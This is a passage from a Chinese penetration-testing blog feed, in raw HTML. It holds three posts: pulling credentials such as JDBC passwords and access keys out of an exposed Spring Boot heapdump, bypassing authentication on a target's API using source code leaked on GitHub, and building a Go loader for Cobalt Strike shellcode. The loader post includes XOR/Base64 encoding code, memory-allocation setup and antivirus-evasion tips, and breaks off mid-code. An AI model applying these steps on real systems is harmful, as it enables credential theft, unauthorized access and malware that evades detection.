class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">heapdump_tool</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar heapdump_tool.jar &lt;heapdump-file&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择模式</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">0,不加载文件,速度较快但精度较低,不能用某些条件</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1,加载文件,需要花几分钟加载,可以查询heapdump中所有的数据</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关键字查询</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">password</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">secret</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取字符串中的URL/File/IP</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">geturl</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">getfile</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">getip</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置字符长度</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">len=10     <span class="comment"># 获取长度为10的所有key或者value值</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取指定顺序</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">num=1-100  <span class="comment"># 获取顺序1-100的字符</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认不输出查询结果非key-value格式的数据</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">all=<span class="literal">true</span>   <span class="comment"># 获取所有值</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JDumpSpider</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -jar JDumpSpider.jar &lt;heapdump-file&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>0、直接使用<code>heapdump_tool.jar</code>查询关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">redis.server</span><br><span class="line">redis.cache</span><br><span class="line">jdbc</span><br><span class="line">AccessKey</span><br><span class="line">SecretKey</span><br><span class="line">mysql</span><br><span class="line">oracle</span><br></pre></td></tr></table></figure><p>1、使用JDK自带工具<code>jvisualvm</code>打开该文件。(该工具在<code>&lt;JDK_HOME&gt;/bin</code>目录下，Windows为<code>jvisualvm.exe</code>)<br>2、打开文件后已经可以看到部分敏感信息泄露<br>3、点击“类”，搜索<code>Hashtable</code><br>4、点击进入<code>Hashtable$Entry</code>，寻找敏感信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 部分ODL查询语句</span><br><span class="line"># 模糊查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.lang.String s <span class="keyword">where</span> toString(s) <span class="keyword">LIKE</span> &quot;.*SESSION*.&quot;</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回实例ID</span><br><span class="line"><span class="keyword">select</span> s <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())  </span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回Key全部内容</span><br><span class="line"><span class="keyword">select</span> s.key.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在Key中,返回<span class="keyword">Value</span>的内容</span><br><span class="line"><span class="keyword">select</span> s.value.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.key.toString())</span><br><span class="line"></span><br><span class="line"># 查询字符串是否在<span class="keyword">Value</span>中,返回<span class="keyword">Value</span>全部内容</span><br><span class="line"><span class="keyword">select</span> s.value.toString() <span class="keyword">from</span> java.util.Hashtable$Entry s <span class="keyword">where</span> <span class="operator">/</span>jdbc<span class="operator">/</span>.test(s.value.toString())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><ul><li>通过浏览器访问对应路径将<code>heapdump</code>文件进行下载</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-0.jpg" data-caption="actuator-heapdump-堆转储文件泄露-0"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-0.jpg" alt="actuator-heapdump-堆转储文件泄露-0"></a></p><ul><li>然后使用JDK自带工具<code>JVisualVM</code>工具对其进行分析，该工具在<code>&lt;JDK_HOME&gt;/bin/</code>目录下。<ul><li><code>JVisualVM</code>是一个监视，故障排除工具</li><li>也可以使用<code>Eclipse MAT</code>对其进行分析<ul><li>参考：<a href="https://www.cnblogs.com/wyb628/p/8567610.html">Java内存泄漏分析系列之六：JVM Heap Dump（堆转储文件）的生成和MAT的使用</a></li></ul></li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-1.jpg" data-caption="actuator-heapdump-堆转储文件泄露-1"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-1.jpg" alt="actuator-heapdump-堆转储文件泄露-1"></a></p><ul><li>其实通过<code>JVisualVM</code>加载<code>heapdump</code>文件时，已经可以看到部分敏感信息泄露</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-2.jpg" data-caption="actuator-heapdump-堆转储文件泄露-2"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-2.jpg" alt="actuator-heapdump-堆转储文件泄露-2"></a></p><ul><li>打开后进入ODL控制台，输入如下语句，点击执行进行查询</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>也可以点击”类”，搜索<code>Hashtable</code>，然后点击进入第一个<code>java.util.Hashtable$Entry</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-3.jpg" data-caption="actuator-heapdump-堆转储文件泄露-3"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-3.jpg" alt="actuator-heapdump-堆转储文件泄露-3"></a><br><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-4.jpg" data-caption="actuator-heapdump-堆转储文件泄露-4"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-4.jpg" alt="actuator-heapdump-堆转储文件泄露-4"></a></p><ul><li>通过对左侧实例进行观察，这里发现了JDBC明文密码以及路径</li></ul><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-5.jpg" data-caption="actuator-heapdump-堆转储文件泄露-5"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-5.jpg" alt="actuator-heapdump-堆转储文件泄露-5"></a></p><p><a data-fancybox="gallery" data-src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-6.jpg" data-caption="actuator-heapdump-堆转储文件泄露-6"><img src="/assets/actuator-heapdump-%E5%A0%86%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-6.jpg" alt="actuator-heapdump-堆转储文件泄露-6"></a></p><ul><li>打完收工，整理报告，提交审核。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.freebuf.com/news/193509.html">Springboot之actuator配置不当的漏洞利用</a></li><li><a href="https://www.cnblogs.com/wyb628/p/8567610.html">Java内存泄漏分析系列之六：JVM Heap Dump（堆转储文件）的生成和MAT的使用</a></li><li><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">Springboot 获取被星号脱敏的密码的明文の方法四-测试</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Case </tag>
            
            <tag> Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github源码泄漏导致权限绕过</title>
      <link href="/posts/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87.html"/>
      <url>/posts/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>某众测项目在 Github 意外发现目标某系统部分源码，通过简单审计发现存在可绕过鉴权并获取敏感信息</p></blockquote><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ul><li>首先把源码下载下来，打开其中的<code>utils/operation_send.py</code>文件。此处通过<code>data/base.json</code>文件获取相关参数，完成鉴权并发起测试请求。关键代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取并计算signature</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_signature</span>(<span class="params">self</span>):</span><br><span class="line">    params = self.__params.items()</span><br><span class="line">    params = <span class="built_in">sorted</span>(params,key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>].lower())</span><br><span class="line">    <span class="comment">#生成signature</span></span><br><span class="line">    signature = base64.encodebytes(</span><br><span class="line">        hmac.new(self.__secret_key.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                 urlencode(params).lower().replace(<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;%20&#x27;</span>).replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;%3A&#x27;</span>).replace(<span class="string">&quot;%7E&quot;</span>,<span class="string">&#x27;~&#x27;</span>).encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                 hashlib.sha1).digest()</span><br><span class="line">    ).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(signature,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test = OperationJsonUtil(<span class="string">&quot;base&quot;</span>)</span><br><span class="line">    auth = OperationAuthUtil()</span><br><span class="line">    auth.set_params(test.get_params(<span class="string">&quot;index_list&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure><ul><li>这里主要调用<code>get_signature()</code>函数完成鉴权，而下面的<code>auth.set_params(test.get_params(&quot;xxx&quot;))</code>则指定要执行的<code>Action</code>，对应右侧<code>data/base.json</code>文件中的字典名。如这里输入<code>index_list</code>即表明调用<code>Action=ListLogIndex</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-0.png" data-caption="Github源码泄漏导致权限绕过-0"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-0.png" alt="Github源码泄漏导致权限绕过-0"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>开启BurpSuite，监听<code>8080</code>端口</li><li>打开<code>utils/operation_send.py</code>文件，修改下面代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from utils.operation_json import OperationJsonUtil</span></span><br><span class="line"><span class="keyword">from</span> operation_json <span class="keyword">import</span> OperationJsonUtil</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>然后添加2行代码，把流量转发到 BurpSuite</li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-1.png" data-caption="Github源码泄漏导致权限绕过-1"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-1.png" alt="Github源码泄漏导致权限绕过-1"></a></p><ul><li>运行该脚本，可以在BurpSuite看到响应：</li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-2.png" data-caption="Github源码泄漏导致权限绕过-2"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-2.png" alt="Github源码泄漏导致权限绕过-2"></a></p><ul><li>将<code>main</code>函数中下面这行修改为<code>project_list</code>，即可调用<code>ListLogProject</code>这个功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># auth.set_params(test.get_params(&quot;index_list&quot;))</span></span><br><span class="line">auth.set_params(test.get_params(<span class="string">&quot;project_list&quot;</span>))</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-3.png" data-caption="Github源码泄漏导致权限绕过-3"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-3.png" alt="Github源码泄漏导致权限绕过-3"></a></p><ul><li>还有<code>CreateLogIndex/DeleteLogIndex/CreateProject/DeleteLogProject</code>等可增加或删除的功能（参考<code>data/base.json</code>文件），利用方式相同，但具有一定风险，因此没有进行测试。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Case </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go免杀初探</title>
      <link href="/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"/>
      <url>/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>Shellcode：指一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。</li><li>Raw：Raw文件是可以直接进行字节操作读取的，因此加载到内存较为方便。本文全部使用Cobaltstrike生成的<code>bin</code>文件</li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" data-caption="Go免杀初探-0"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-0.png" alt="Go免杀初探-0"></a></p><h3 id="程序内存空间"><a href="#程序内存空间" class="headerlink" title="程序内存空间"></a>程序内存空间</h3><p>在冯诺依曼的体系结构中，一个进程必须有：Text 代码段、Data 数据段、BSS 堆栈段</p><ul><li>Text（只读）：存放程序代码的区域，它是由编译器在编译连接时自动计算的。</li><li>Data（可读可写）：存放编译阶段（而非运行时）就能确定的数据，即通常所说的静态存储区。赋予初值的全局和静态变量、常量就是存在这个区域</li><li>BSS（可读可写）：通常是用来存储未初始化或初始化为 0 的全局变量、静态变量的内存区域<ul><li>Stack 栈：保存函数的局部变量和参数</li><li>Heap 堆：保存函数内部动态分配内存，即程序的动态变量</li></ul></li></ul><p><a data-fancybox="gallery" data-src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" data-caption="Go免杀初探-1"><img src="/assets/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2-1.png" alt="Go免杀初探-1"></a></p><ul><li>函数指针：指向函数的指针变量。程序编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。函数指针有两个用途：调用函数和作为函数的参数。</li><li>函数指针声明：<code>void(*pFunction)()</code>，没有参数时可写成<code>void(*pFunction)(void)</code>。<ul><li>那么<code>pFunction</code>函数指针的原型就是 <code>void (*)()</code>，即把变量名去掉</li><li>对于一个给定的<code>entry</code>地址，要把它转换成为函数指针，就是<code>(void (*) ())entry</code></li><li>那么调用这个函数指针的方式就是<code>((void(*)())entry)()</code></li></ul></li></ul><h3 id="查杀与免杀"><a href="#查杀与免杀" class="headerlink" title="查杀与免杀"></a>查杀与免杀</h3><p>杀软通用的查杀姿势一般可以分为静态查杀、动态查杀以及云查杀，更好一点的杀软还拥有主动防御功能。</p><ul><li>静态查杀：主要有静态的签名查杀和启发式查杀<ul><li>签名查杀：<ul><li>从病毒体中提取的病毒特征码，逐个与程序文件比较</li><li>特征码是反病毒公司在分析病毒时，确定的只有该病毒才可能会有的一系列二进制串，由这些特征可以识别出病毒程序</li></ul></li><li>启发式查杀：虚拟机引擎和行为检测相结合，通过模拟执行， 分析程序行为的安全检测技术。</li></ul></li><li>行为查杀：杀软一般是对系统多个API进行了hook，如：注册表操作、添加启动项、添加服务、添加用户、注入、创建进程、创建线程、加载DLL等等。杀软除了进行hook关键API，还会对API调用链进行监控，如：申请内存，将shellcode加载进内存，再执行内存区域shellcode。</li><li>云查杀：<ul><li>云安全机制是一种新兴的安全查杀机制，不同的安全厂商的云安全查杀机制不一样。</li><li>360安全卫士基于云共享特征库扫描机制，电脑管家基于主动防御信誉云的扫描机制。</li></ul></li></ul><p>免杀</p><ul><li>静态免杀： 对抗基于特征的静态免杀比较简单，可以使用加壳改壳、添加&#x2F;替换资源文件、修改特征码、Shellcode 编码&#x2F;加密（AES&#x2F;DES&#x2F;Base64&#x2F;Xor），目的是去除ShellCode特征</li><li>行为免杀：API 替换、使用未被 Hook 的 API、直接系统调用、替换操作方式采用白加黑手段等</li></ul><h3 id="Go相关"><a href="#Go相关" class="headerlink" title="Go相关"></a>Go相关</h3><blockquote><p>Go编写的程序很多杀软都会报毒（哪怕是HelloWorld）</p></blockquote><ul><li>Tips：编码这块可使用 Xor 异或，不需要引入额外的包。因为 Go 编写的 Loader 体积较大，再引入包会更大</li><li>编译时经常会添加参数<code>-ldflags=&quot;-H windowsgui&quot;</code>，其作用是隐藏CMD窗口</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go build -ldflags=<span class="string">&quot;-s -w -H=windowsgui&quot;</span> -o main.exe main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># -o 指定输出文件名</span></span><br><span class="line"><span class="comment"># -s -w 减小体积</span></span><br><span class="line"><span class="comment"># -H=windowsgui 隐藏窗口</span></span><br></pre></td></tr></table></figure><ul><li>默认<code>go build</code>的exe都是当前操作系统的可执行文件，如果需要跨平台，只需要指定目标操作系统的平台和处理器架构即可。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译当前操作系统的可执行文件</span></span><br><span class="line">$ go build main.go</span><br><span class="line">$ go build -o &lt;Other_Name&gt; main.go</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【无弹窗】Mac编译exe</span></span><br><span class="line">$ CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 go build -ldflags <span class="string">&quot;-s -w -H=windowsgui&quot;</span> main.go</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><ul><li>Loader Tips：<ul><li>加载DLL，采用动态调用的方式，可以避免 IAT 的 Hook</li><li>不要直接申请 RWX (读写执行)的内存，可先申请 RW 内存，后面再改为可执行，杀软对 RWX 的内存很敏感</li><li>加载到内存的方法非常多，除了常见的<code>copy</code>和<code>move</code>还有<code>uuid</code>这种加载既能达到加密Shellcode 的效果，还能直接加载到内存</li><li>执行内存，还可以用回调来触发如 EnumChildWindows，参考：<a href="https://github.com/aahmad097/AlternativeShellcodeExec">AlternativeShellcodeExec</a></li><li>API调用中间可以插入一些没用的代码，打乱API调用</li><li>适当加一些 sleep，可以过一些沙箱</li></ul></li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><blockquote><p>由于反病毒软件对于默认生成的文件查杀较为严格，所以需要先对其进行混淆加密，然后再通过解密还原</p></blockquote><ul><li>这里使用XOR异或加密，加密部分可以自行修改，但后续解密部分需要做相应调整</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>, <span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异或混淆加密,然后进行Base64编码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getEnCode</span><span class="params">(shellcode []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">var</span> xorShellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(shellcode); i++ &#123;</span><br><span class="line">xorShellcode = <span class="built_in">append</span>(xorShellcode, shellcode[i]^key[<span class="number">2</span>]^key[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64.StdEncoding.EncodeToString(xorShellcode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件中读取Shellcode</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileShellCode</span><span class="params">(file <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">shellcode, err := ioutil.ReadFile(file)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Print(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">shellcode := getFileShellCode(<span class="string">&quot;payload.bin&quot;</span>)</span><br><span class="line">fmt.Println(getEnCode(shellcode))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>bin文件太大的话，加密后的字符会很多，可以重定向到文件中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go run xor_shellcode.go &gt; xor.txt</span><br></pre></td></tr></table></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>Shellcode的执行步骤：首先需要通过Loader加载器去申请一块内存，然后使用将Shellcode加载到这块内存：中，最后执行这块内存。</p><ul><li>首先定义用到的函数和变量</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>  <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x21</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line"><span class="comment">// RtlMoveMemory = ntdll.MustFindProc(&quot;RtlMoveMemory&quot;)</span></span><br><span class="line">    RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>编写Shellcode的解密代码，还原恶意载荷</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getDeCode</span><span class="params">(src <span 